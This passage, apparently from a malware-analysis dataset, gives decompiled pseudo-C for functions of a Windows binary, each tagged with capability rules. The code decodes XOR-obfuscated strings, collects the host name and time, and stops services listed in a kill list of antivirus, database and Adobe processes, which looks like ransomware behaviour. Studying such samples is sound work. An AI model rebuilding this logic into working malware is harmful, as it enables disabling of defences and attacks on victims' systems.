0xffffff00;\ncode_r0x0040da01:\n    *0x429260 = uVar5;\n    *0x429261 = 0x55;\n    if ((uVar5 & 0xffff0000 | in_GS) != 0) {\n        *0x429261 = 0x33;\n    }\n    *0x429262 = (var_90h != 0) * '\\x04' + -0x26;\n    (*_sym.imp.KERNEL32.dll_GetLocalTime)(&lpSystemTime);\n    uVar5 = 0;\n    *0x429265 = var_e6h;\n    *0x429263 = var_eah;\n    *0x429264 = lpSystemTime._2_1_;\n    *0x429266 = var_eah._2_1_;\n    var_8ah = *0x4244e0;\n    var_86h = *0x4244e4;\n    uStack134 = *0x4244e8;\n    uStack130 = *0x4244ec;\n    var_7ah = 0x3064203;\n    var_76h = 0x42031c42;\n    do {\n        var_8ah._0_1_ = *0x4244e0;\n        puVar1 = &var_8ah + uVar5 + 1;\n        *puVar1 = *puVar1 ^ var_8ah;\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x17);\n    var_72h._0_1_ = 0;\n    fcn.0040a0b0(&var_8ah + 1, var_eah);\n    *0x429334 = *0x429334 + 7;\n    nSize = 0x40;\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(&lpBuffer, &nSize);\n    iVar2 = nSize;\n    if (iVar4 != 0) {\n        fcn.0040cbe0(0x429267, &lpBuffer, nSize);\n        *0x429334 = *0x429334 + iVar2;\n    }\n    var_ch._0_1_ = 0x4d;\n    var_ch._1_1_ = 0x50;\n    var_ch._2_1_ = 0x43;\n    var_ch._3_1_ = 0x3a;\n    var_8h = 0x732520;\n    fcn.0040a0b0(&var_ch + 1, &lpBuffer);\n    return 0;\n}\n",
        "token_count": 5094
    },
    "0040db80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040db80(void)\n\n{\n    uchar uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint8_t *puVar10;\n    ushort extraout_var;\n    code *pcVar11;\n    ushort extraout_var_00;\n    uint32_t uVar12;\n    uint32_t arg_8h;\n    ushort in_GS;\n    int32_t in_FS_OFFSET;\n    uchar uStack0000001b;\n    uchar in_stack_0000001c;\n    uchar uStack0000001e;\n    uchar uStack00000020;\n    uint32_t in_stack_00000020;\n    uchar in_stack_00000024;\n    uchar uStack00000027;\n    uchar uStack0000002a;\n    uchar uStack0000002d;\n    uchar in_stack_00000030;\n    uchar uStack00000033;\n    uchar uStack00000036;\n    uchar uStack00000039;\n    uchar in_stack_0000003c;\n    uchar uStack0000003f;\n    uchar uStack00000042;\n    uchar uStack00000045;\n    uchar in_stack_00000048;\n    uchar uStack0000004b;\n    uint in_stack_00000060;\n    uchar uStack0000007f;\n    uchar in_stack_00000080;\n    uchar uStack00000082;\n    uchar uStack00000085;\n    uchar in_stack_00000088;\n    uchar uStack0000008b;\n    uchar uStack0000008e;\n    uchar uStack00000090;\n    uint32_t in_stack_00000090;\n    uchar in_stack_00000094;\n    uchar uStack00000097;\n    uchar uStack0000009a;\n    uchar uStack0000009d;\n    uchar in_stack_000000a0;\n    uchar uStack000000a3;\n    uchar uStack000000a6;\n    uchar uStack000000a9;\n    uchar in_stack_000000ac;\n    uchar uStack000000af;\n    uchar uStack000000b2;\n    uchar uStack000000b5;\n    uchar in_stack_000000b8;\n    uchar uStack000000bb;\n    ushort uStack000000bc;\n    uint32_t in_stack_000000bc;\n    uchar uStack000000f8;\n    uint32_t in_stack_000000f8;\n    uchar in_stack_000000fc;\n    uchar uStack000000ff;\n    uchar uStack00000102;\n    uchar uStack00000105;\n    uchar in_stack_00000108;\n    uchar uStack0000010b;\n    uchar uStack0000010e;\n    uchar uStack00000111;\n    uchar in_stack_00000114;\n    uchar uStack00000116;\n    uchar uStack00000117;\n    uchar uStack00000119;\n    uchar uStack0000011a;\n    uchar uStack0000011b;\n    uchar in_stack_0000011c;\n    uchar uStack0000011d;\n    uchar uStack0000011f;\n    uchar in_stack_00000120;\n    uchar uStack00000122;\n    uchar uStack00000123;\n    uchar uStack00000125;\n    uchar uStack00000126;\n    uchar in_stack_00000128;\n    uchar uStack00000129;\n    uchar uStack0000012b;\n    uchar in_stack_0000012c;\n    uchar uStack0000012e;\n    uchar uStack0000012f;\n    uchar uStack00000131;\n    uchar uStack00000132;\n    uchar in_stack_00000134;\n    uchar uStack00000135;\n    uchar uStack00000137;\n    uchar in_stack_00000138;\n    uchar uStack00000139;\n    uchar uStack0000013a;\n    uchar uStack0000013b;\n    uchar uStack0000013d;\n    uchar uStack0000013e;\n    uchar in_stack_00000140;\n    uchar uStack00000141;\n    uchar uStack00000143;\n    uchar in_stack_00000144;\n    uchar uStack00000146;\n    uchar uStack00000147;\n    uchar uStack00000149;\n    uchar uStack0000014a;\n    uchar in_stack_0000014c;\n    uchar uStack0000014d;\n    unkbyte3 Stack00000150;\n    uint32_t in_stack_00000150;\n    uint in_stack_00000188;\n    uint in_stack_000001c8;\n    ushort uVar13;\n    ushort uVar14;\n    uint arglist;\n    uint32_t arg_8h_00;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    uint uVar17;\n    \n    fcn.00401170();\n    fcn.0040cd80();\n    uVar12 = 0;\n    do {\n        (&stack0x00000762)[uVar12] = (&stack0x00000762)[uVar12] ^ 0x42;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xc);\n    uVar12 = 0;\n    do {\n        (&stack0x0000099d)[uVar12] = (&stack0x0000099d)[uVar12] ^ *0x4246c0;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x15);\n    uVar12 = 0;\n    do {\n        (&stack0x000009f9)[uVar12] = (&stack0x000009f9)[uVar12] ^ *0x424d00;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x12);\n    uVar12 = 0;\n    do {\n        (&stack0x00000805)[uVar12] = (&stack0x00000805)[uVar12] ^ 0x51;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xd);\n    uVar12 = 0;\n    do {\n        (&stack0x000009b4)[uVar12] = (&stack0x000009b4)[uVar12] ^ *0x424510;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x15);\n    uVar12 = 0;\n    do {\n        (&stack0x00000c19)[uVar12] = (&stack0x00000c19)[uVar12] ^ *0x424b40;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x10);\n    uVar12 = 0;\n    do {\n        (&stack0x00000a0d)[uVar12] = (&stack0x00000a0d)[uVar12] ^ *0x424750;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x14);\n    uVar12 = 0;\n    do {\n        (&stack0x00000b31)[uVar12] = (&stack0x00000b31)[uVar12] ^ *0x424c90;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x12);\n    uVar12 = 0;\n    do {\n        (&stack0x000009cb)[uVar12] = (&stack0x000009cb)[uVar12] ^ *0x424710;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x15);\n    uVar12 = 0;\n    do {\n        (&stack0x00000823)[uVar12] = (&stack0x00000823)[uVar12] ^ 0x46;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xd);\n    uVar12 = 0;\n    do {\n        (&stack0x00000a39)[uVar12] = (&stack0x00000a39)[uVar12] ^ str.fxxzg._0_4_;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x14);\n    uVar12 = 0;\n    do {\n        (&stack0x0000093e)[uVar12] = (&stack0x0000093e)[uVar12] ^ *0x424b20;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x16);\n    uVar12 = 0;\n    do {\n        (&stack0x0000096e)[uVar12] = (&stack0x0000096e)[uVar12] ^ *0x424580;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x16);\n    uVar12 = 0;\n    do {\n        (&stack0x000008f3)[uVar12] = (&stack0x000008f3)[uVar12] ^ *0x424760;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x19);\n    uVar12 = 0;\n    do {\n        (&stack0x00000c06)[uVar12] = (&stack0x00000c06)[uVar12] ^ *0x424e50;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x11);\n    uVar12 = 0;\n    do {\n        (&stack0x00000986)[uVar12] = (&stack0x00000986)[uVar12] ^ *0x424bf0;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x15);\n    uVar12 = 0;\n    do {\n        (&stack0x00000a62)[uVar12] = (&stack0x00000a62)[uVar12] ^ *0x424d10;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x13);\n    uVar12 = 0;\n    uVar13 = *0x4246a4 >> 0x10;\n    uVar14 = *0x4246a8;\n    do {\n        (&stack0x00000c2b)[uVar12] = (&stack0x00000c2b)[uVar12] ^ *0x4246a0;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x10);\n    uVar12 = 0;\n    do {\n        (&stack0x00000861)[uVar12] = (&stack0x00000861)[uVar12] ^ *0x424650;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x1d);\n    uVar12 = 0;\n    do {\n        (&stack0x000008bb)[uVar12] = (&stack0x000008bb)[uVar12] ^ *0x424d40;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x1a);\n    uVar12 = 0;\n    do {\n        (&stack0x00000956)[uVar12] = (&stack0x00000956)[uVar12] ^ *0x424af0;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x16);\n    uVar12 = 0;\n    do {\n        (&stack0x00000a77)[uVar12] = (&stack0x00000a77)[uVar12] ^ *0x424de0;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x13);\n    uVar12 = 0;\n    do {\n        (&stack0x0000077c)[uVar12] = (&stack0x0000077c)[uVar12] ^ 0x5b;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xb);\n    uVar12 = 0;\n    do {\n        (&stack0x000007e9)[uVar12] = (&stack0x000007e9)[uVar12] ^ 0x12;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xc);\n    uVar12 = 0;\n    do {\n        (&stack0x000009e2)[uVar12] = (&stack0x000009e2)[uVar12] ^ str.h_t_v._0_4_;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x15);\n    uVar12 = 0;\n    do {\n        (&stack0x000008d7)[uVar12] = (&stack0x000008d7)[uVar12] ^ *0x424e40;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x1a);\n    uVar12 = 0;\n    do {\n        (&stack0x0000090e)[uVar12] = (&stack0x0000090e)[uVar12] ^ *0x424d30;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x16);\n    uVar12 = 0;\n    do {\n        (&stack0x00000880)[uVar12] = (&stack0x00000880)[uVar12] ^ *0x424450;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x1c);\n    uVar12 = 0;\n    do {\n        (&stack0x00000a8c)[uVar12] = (&stack0x00000a8c)[uVar12] ^ *0x424430;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x13);\n    uVar12 = 0;\n    do {\n        (&stack0x0000089e)[uVar12] = (&stack0x0000089e)[uVar12] ^ *0x424440;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x1b);\n    uVar12 = 0;\n    do {\n        (&stack0x00000a23)[uVar12] = (&stack0x00000a23)[uVar12] ^ *0x4248d0;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x14);\n    uVar12 = 0;\n    do {\n        (&stack0x00000832)[uVar12] = (&stack0x00000832)[uVar12] ^ 0x5c;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xd);\n    uVar12 = 0;\n    do {\n        (&stack0x00000a4f)[uVar12] = (&stack0x00000a4f)[uVar12] ^ *0x424c20;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x11);\n    uVar12 = 0;\n    do {\n        (&stack0x00000926)[uVar12] = (&stack0x00000926)[uVar12] ^ *0x424e00;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x16);\n    uVar12 = 0;\n    do {\n        (&stack0x00000755)[uVar12] = (&stack0x00000755)[uVar12] ^ 0x75;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xb);\n    uVar12 = 0;\n    do {\n        (&stack0x000007b8)[uVar12] = (&stack0x000007b8)[uVar12] ^ 0x2e;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xc);\n    uVar12 = 0;\n    do {\n        (&stack0x00000814)[uVar12] = (&stack0x00000814)[uVar12] ^ 0x59;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xd);\n    uVar12 = 0;\n    iVar8 = *0x4243d8;\n    do {\n        (&stack0x00000c3d)[uVar12] = (&stack0x00000c3d)[uVar12] ^ *0x4243d0;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xe);\n    uVar12 = 0;\n    do {\n        (&stack0x00000789)[uVar12] = (&stack0x00000789)[uVar12] ^ 0x74;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xb);\n    uVar12 = 0;\n    do {\n        (&stack0x00000796)[uVar12] = (&stack0x00000796)[uVar12] ^ 0x28;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xb);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((iVar3 != 0) || (*(in_FS_OFFSET + 0x34) != 5)) {\n        iVar3 = 0;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n            pcVar11 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n            if (iVar5 != 0) {\n                iVar5 = 0x24;\n                iVar6 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)();\n                pcVar11 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                if (iVar6 == 0) {\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n                }\n                else {\n                    iVar6 = CONCAT22(uVar14, uVar13);\n                    if (iVar6 == 1) {\n                        uVar12 = 0;\n                        do {\n                            (&stack0x00000b25)[uVar12] = (&stack0x00000b25)[uVar12] ^ *0x424600;\n                            uVar12 = uVar12 + 1;\n                        } while (uVar12 < 0x12);\n                        fcn.0040a0b0(&stack0x00000b25, *(&stack0x00000c78 + iVar3 * 4));\n                        pcVar11 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n                    }\n                    else {\n                        while (iVar6 == 3) {\n                            (*_sym.imp.KERNEL32.dll_Sleep)();\n                            iVar6 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)();\n                            if (iVar6 == 0) {\ncode_r0x00410116:\n                                iVar3 = iVar3 + 1;\n                                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n                            }\n                            else {\n                                if (CONCAT22(uVar14, uVar13) == 1) {\n                                    uVar12 = 0;\n                                    do {\n                                        (&stack0x00000b39)[uVar12] = (&stack0x00000b39)[uVar12] ^ *0x424ad0;\n                                        uVar12 = uVar12 + 1;\n                                    } while (uVar12 < 0x12);\n                                    fcn.0040a0b0(&stack0x00000b39, *(&stack0x00000c78 + iVar3 * 4));\n                                    goto code_r0x00410116;\n                                }\n                                iVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                                if (30000 < iVar6 - iVar5) goto code_r0x00410116;\n                            }\n                            iVar6 = CONCAT22(uVar14, uVar13);\n                        }\n                        fcn.0041a260();\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_ControlService)();\n                        pcVar11 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                        if (iVar5 != 0) {\njoined_r0x00410165:\n                            pcVar11 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                            if (iVar8 != 1) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)();\n                                iVar5 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)();\n                                if (iVar5 == 0) goto code_r0x004101b7;\n                                if (iVar8 != 1) goto code_r0x004101a6;\n                                uVar12 = 0;\n                                do {\n                                    (&stack0x00000b61)[uVar12] = (&stack0x00000b61)[uVar12] ^ *0x424d80;\n                                    uVar12 = uVar12 + 1;\n                                } while (uVar12 < 0x12);\n                                fcn.0040a0b0(&stack0x00000b61, *(&stack0x00000c8c + iVar3 * 4));\n                                pcVar11 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                            }\n                            goto code_r0x00410229;\n                        }\n                        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n                    }\n                }\n            }\ncode_r0x00410229:\n            iVar3 = iVar3 + 1;\n        } while (*(&stack0x00000c8c + iVar3 * 4) != 0);\n        (*pcVar11)();\n    }\n    uVar17 = 0;\n    (*_sym.imp.ole32.dll_CoInitializeEx)();\n    uVar12 = 0;\n    do {\n        (&stack0x00001014)[uVar12] = (&stack0x00001014)[uVar12] ^ *0x424cd0;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 199);\n    uVar12 = 0;\n    do {\n        (&stack0x00000796)[uVar12] = (&stack0x00000796)[uVar12] ^ 0x28;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0xc);\n    uVar12 = 0;\n    do {\n        puVar7 = fcn.00401010(uVar12);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar17 >> 0x18;\n    } while (uVar12 < 8);\n    puVar7 = fcn.00401010(8);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6a);\n    fcn.00401120(0x61);\n    uVar17 = 0x76;\n    fcn.00401120(0x76);\n    fcn.00401120(0x61);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 4);\n    puVar7 = fcn.00401010(4);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x33);\n    fcn.00401120(0x36);\n    fcn.00401120(0x30);\n    uVar17 = 0x73;\n    fcn.00401120(0x73);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 5);\n    puVar7 = fcn.00401010(5);\n    *puVar7 = 0;\n    fcn.00401000();\n    in_stack_00000150 = CONCAT13(0x72, Stack00000150);\n    uVar2 = fcn.00401120(0x33);\n    in_stack_00000150 = in_stack_00000150 & 0xffffff00 | uVar2;\n    uStack0000014d = fcn.00401120(0x36);\n    uStack0000014a = fcn.00401120(0x30);\n    uStack00000147 = fcn.00401120(100);\n    in_stack_00000144 = fcn.00401120(0x6f);\n    uStack00000141 = fcn.00401120(99);\n    uStack0000013e = fcn.00401120(0x74);\n    uVar17 = 0x6f;\n    uStack0000013b = fcn.00401120(0x6f);\n    in_stack_00000138 = fcn.00401120(0x72);\n    uVar12 = 0;\n    uStack00000139 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 9);\n    puVar7 = fcn.00401010(9);\n    *puVar7 = 0;\n    fcn.00401000();\n    in_stack_00000114 = 0x24;\n    uStack00000111 = fcn.00401120(0x77);\n    uStack0000010e = fcn.00401120(100);\n    uStack0000010b = fcn.00401120(0x73);\n    in_stack_00000108 = fcn.00401120(0x77);\n    uStack00000105 = fcn.00401120(0x66);\n    uStack00000102 = fcn.00401120(0x73);\n    uStack000000ff = fcn.00401120(0x61);\n    uVar17 = 0x66;\n    in_stack_000000fc = fcn.00401120(0x66);\n    uVar1 = fcn.00401120(0x65);\n    _uStack000000f8 = CONCAT11(uVar1, uStack000000f8);\n    uVar12 = 0;\n    in_stack_000000f8 = in_stack_000000f8 & 0xff000000 | _uStack000000f8;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 9);\n    puVar7 = fcn.00401010(9);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x66);\n    fcn.00401120(100);\n    fcn.00401120(0x68);\n    fcn.00401120(0x6f);\n    uVar17 = 0x73;\n    fcn.00401120(0x73);\n    fcn.00401120(0x74);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x47);\n    fcn.00401120(0x44);\n    fcn.00401120(0x73);\n    fcn.00401120(99);\n    uVar17 = 0x61;\n    fcn.00401120(0x61);\n    fcn.00401120(0x6e);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    fcn.00401000();\n    uStack00000141 = 8;\n    uStack0000013e = fcn.00401120(0x5a);\n    uStack0000013b = fcn.00401120(0x68);\n    in_stack_00000138 = fcn.00401120(0x75);\n    uStack00000135 = fcn.00401120(0x44);\n    uStack00000132 = fcn.00401120(0x6f);\n    uStack0000012f = fcn.00401120(0x6e);\n    in_stack_0000012c = fcn.00401120(0x67);\n    uStack00000129 = fcn.00401120(0x46);\n    uStack00000126 = fcn.00401120(0x61);\n    uStack00000123 = fcn.00401120(0x6e);\n    in_stack_00000120 = fcn.00401120(0x67);\n    uVar17 = 0x59;\n    uStack0000011d = fcn.00401120(0x59);\n    uStack0000011a = fcn.00401120(0x75);\n    uVar12 = 0;\n    uStack0000011b = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xd);\n    puVar7 = fcn.00401010(0xd);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x51);\n    fcn.00401120(0x42);\n    fcn.00401120(0x44);\n    fcn.00401120(0x42);\n    fcn.00401120(0x4d);\n    fcn.00401120(0x67);\n    uVar17 = 0x72;\n    fcn.00401120(0x72);\n    fcn.00401120(0x4e);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 8);\n    puVar7 = fcn.00401010(8);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6d);\n    fcn.00401120(0x79);\n    fcn.00401120(0x73);\n    fcn.00401120(0x71);\n    uVar17 = 0x6c;\n    fcn.00401120(0x6c);\n    fcn.00401120(100);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    fcn.00401000();\n    in_stack_0000014c = 0x20;\n    uStack00000149 = fcn.00401120(0x41);\n    uStack00000146 = fcn.00401120(0x75);\n    uStack00000143 = fcn.00401120(0x74);\n    in_stack_00000140 = fcn.00401120(0x6f);\n    uStack0000013d = fcn.00401120(100);\n    uStack0000013a = fcn.00401120(0x65);\n    uStack00000137 = fcn.00401120(0x73);\n    in_stack_00000134 = fcn.00401120(0x6b);\n    uStack00000131 = fcn.00401120(0x44);\n    uStack0000012e = fcn.00401120(0x65);\n    uStack0000012b = fcn.00401120(0x73);\n    in_stack_00000128 = fcn.00401120(0x6b);\n    uStack00000125 = fcn.00401120(0x74);\n    uStack00000122 = fcn.00401120(0x6f);\n    uStack0000011f = fcn.00401120(0x70);\n    in_stack_0000011c = fcn.00401120(0x41);\n    uVar17 = 0x70;\n    uStack00000119 = fcn.00401120(0x70);\n    uStack00000116 = fcn.00401120(0x70);\n    uStack00000117 = 0;\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x12);\n    puVar7 = fcn.00401010(0x12);\n    *puVar7 = 0;\n    fcn.00401000();\n    uStack0000003f = 0x1f;\n    in_stack_0000003c = fcn.00401120(0x61);\n    uStack00000039 = fcn.00401120(99);\n    uStack00000036 = fcn.00401120(0x77);\n    uStack00000033 = fcn.00401120(0x65);\n    in_stack_00000030 = fcn.00401120(0x62);\n    uStack0000002d = fcn.00401120(0x62);\n    uStack0000002a = fcn.00401120(0x72);\n    uStack00000027 = fcn.00401120(0x6f);\n    in_stack_00000024 = fcn.00401120(0x77);\n    uVar1 = fcn.00401120(0x73);\n    uVar17 = 0x65;\n    _uStack00000020 = CONCAT11(uVar1, uStack00000020);\n    in_stack_00000020 = in_stack_00000020 & 0xffff0000 | _uStack00000020;\n    uStack0000001e = fcn.00401120(0x65);\n    uStack0000001b = fcn.00401120(0x72);\n    uVar12 = 0;\n    in_stack_0000001c = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xc);\n    puVar7 = fcn.00401010(0xc);\n    *puVar7 = 0;\n    fcn.00401000();\n    uStack0000004b = 0x1b;\n    in_stack_00000048 = fcn.00401120(0x43);\n    uStack00000045 = fcn.00401120(0x72);\n    uStack00000042 = fcn.00401120(0x65);\n    uStack0000003f = fcn.00401120(0x61);\n    in_stack_0000003c = fcn.00401120(0x74);\n    uStack00000039 = fcn.00401120(0x69);\n    uStack00000036 = fcn.00401120(0x76);\n    uStack00000033 = fcn.00401120(0x65);\n    in_stack_00000030 = fcn.00401120(0x20);\n    uStack0000002d = fcn.00401120(0x43);\n    uStack0000002a = fcn.00401120(0x6c);\n    uStack00000027 = fcn.00401120(0x6f);\n    uVar17 = 0x75;\n    in_stack_00000024 = fcn.00401120(0x75);\n    uVar1 = fcn.00401120(100);\n    _uStack00000020 = CONCAT11(uVar1, uStack00000020);\n    uVar12 = 0;\n    in_stack_00000020 = in_stack_00000020 & 0xff000000 | _uStack00000020;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xe);\n    puVar7 = fcn.00401010(0xe);\n    *puVar7 = 0;\n    fcn.00401000();\n    _uStack000000bc = CONCAT12(0x71, uStack000000bc);\n    in_stack_000000bc = in_stack_000000bc & 0xff000000 | _uStack000000bc;\n    uStack000000bb = fcn.00401120(0x41);\n    in_stack_000000b8 = fcn.00401120(100);\n    uStack000000b5 = fcn.00401120(0x6f);\n    uStack000000b2 = fcn.00401120(0x62);\n    uStack000000af = fcn.00401120(0x65);\n    in_stack_000000ac = fcn.00401120(0x20);\n    uStack000000a9 = fcn.00401120(0x44);\n    uStack000000a6 = fcn.00401120(0x65);\n    uStack000000a3 = fcn.00401120(0x73);\n    in_stack_000000a0 = fcn.00401120(0x6b);\n    uStack0000009d = fcn.00401120(0x74);\n    uStack0000009a = fcn.00401120(0x6f);\n    uStack00000097 = fcn.00401120(0x70);\n    in_stack_00000094 = fcn.00401120(0x20);\n    uVar1 = fcn.00401120(0x53);\n    _uStack00000090 = CONCAT11(uVar1, uStack00000090);\n    in_stack_00000090 = in_stack_00000090 & 0xffff0000 | _uStack00000090;\n    uStack0000008e = fcn.00401120(0x65);\n    uStack0000008b = fcn.00401120(0x72);\n    in_stack_00000088 = fcn.00401120(0x76);\n    uStack00000085 = fcn.00401120(0x69);\n    uVar17 = 99;\n    uStack00000082 = fcn.00401120(99);\n    uStack0000007f = fcn.00401120(0x65);\n    uVar12 = 0;\n    in_stack_00000080 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x15);\n    puVar7 = fcn.00401010(0x15);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x43);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x72);\n    fcn.00401120(0x65);\n    fcn.00401120(0x53);\n    fcn.00401120(0x79);\n    uVar17 = 0x6e;\n    fcn.00401120(0x6e);\n    fcn.00401120(99);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 8);\n    puVar7 = fcn.00401010(8);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x41);\n    